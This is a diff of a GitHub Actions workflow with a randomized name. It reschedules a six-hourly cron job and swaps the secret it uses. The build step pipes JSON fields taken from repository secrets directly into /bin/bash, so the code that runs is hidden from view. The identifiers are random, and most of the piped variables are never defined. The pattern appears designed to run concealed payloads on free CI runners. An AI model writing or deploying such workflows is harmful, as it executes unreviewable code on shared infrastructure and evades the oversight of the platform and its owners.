@@ -1,27 +1,27 @@
 name: zhangshancui4657
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '36 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangshancui4657
         env:
-          gp40: ${{ secrets.gp40 }}
+          bndpi97355: ${{ secrets.bndpi97355 }}
         run: |
-          echo $gp40 | jq -r .m9586 | /bin/bash
-          echo $e9312 | jq -r .c5759 | /bin/bash
-          echo $qt277 | jq -r .p66171 | /bin/bash
-          echo $s2268 | jq -r .hblcs63694 | /bin/bash
-          echo $qxcu8 | jq -r .yydi120 | /bin/bash
-          echo $guvq7 | jq -r .ojcku30631 | /bin/bash
-          echo $p215 | jq -r .s4 | /bin/bash
-          echo $l1547 | jq -r .eies5 | /bin/bash
-          echo $qf14371 | jq -r .a16781 | /bin/bash
-          echo $runxr685 | jq -r .n32 | /bin/bash
-          echo $m6 | jq -r .evj1 | /bin/bash
+          echo $bndpi97355 | jq -r .utkp53974 | /bin/bash
+          echo $g9352 | jq -r .n20 | /bin/bash
+          echo $a89908 | jq -r .oeh30 | /bin/bash
+          echo $zqam488 | jq -r .ix7 | /bin/bash
+          echo $oky9 | jq -r .njvep4748 | /bin/bash
+          echo $muu87 | jq -r .mimr95 | /bin/bash
+          echo $gcpu95722 | jq -r .shqw02 | /bin/bash
+          echo $et471 | jq -r .hscy93 | /bin/bash
+          echo $s6 | jq -r .zmlsh07 | /bin/bash
+          echo $u90 | jq -r .taubu96 | /bin/bash
 
